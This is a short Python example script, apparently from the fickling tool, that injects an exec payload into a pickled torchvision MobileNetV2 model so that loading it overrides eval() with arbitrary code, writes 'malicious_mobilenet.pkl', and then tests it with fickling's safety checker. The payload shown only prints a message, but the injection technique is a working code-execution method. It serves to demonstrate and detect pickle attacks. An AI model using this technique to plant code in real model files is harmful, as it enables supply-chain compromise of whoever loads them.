import pickle

import torchvision.models as models

import fickling
from fickling.fickle import Pickled

# Use fickling to override a custom method (.eval())

model = models.mobilenet_v2()

print("Running eval()")
model.eval()
print("Finished running eval()\n\n")

payload = '''exec("""type(model).eval = eval('lambda model: print("!!!!We can run whatever custom Python code we want to!!!!")')""")'''  # noqa
fickled_model = Pickled.load(pickle.dumps(model))

# Use the insert_python_exec() method to inject the payload
fickled_model.insert_python_exec(payload)
model = pickle.loads(fickled_model.dumps())

print("Running eval()")
model.eval()
print("Finished running eval()")

# Serialize malicious model
print("\n\nIs this safe?")
with open("malicious_mobilenet.pkl", "wb") as f:
    pickle.dump(model, f)

# Determine if the file is likely safe
result = fickling.is_likely_safe("malicious_mobilenet.pkl")
print(result)
